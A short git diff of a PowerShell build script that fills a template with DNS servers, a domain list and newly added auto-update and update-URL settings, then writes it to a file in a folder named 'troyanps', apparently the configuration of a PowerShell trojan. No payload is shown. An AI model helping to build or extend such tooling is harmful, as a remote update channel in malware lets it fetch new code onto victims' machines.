@@ -14,6 +14,8 @@ Write-Host "preCompile"
 $template = @"
 `$PrimaryDNSServer = '1.1.1.1'
 `$SecondaryDNSServer = '2.2.2.2'
+`$autoUpdate = '_autoUpdate'
+`$updateUrl = '_updateUrl'
 `$xdata = @{
     JOPA
 }
@@ -42,6 +44,8 @@ foreach ($domain in $server.domains) {
 $listString = $stringList -join [System.Environment]::NewLine
 $template = $template -replace "1\.1\.1\.1", $server.primaryDns
 $template = $template -replace "2\.2\.2\.2", $server.secondaryDns
+$template = $template -replace "_autoUpdate", $server.autoUpdate
+$template = $template -replace "_updateUrl", $server.updateUrl
 $template  = $template -replace "JOPA", $listString
 $troyan = Join-Path -Path $scriptDir -ChildPath '..\troyanps\consts.ps1'
 $template | Set-Content -Path $troyan
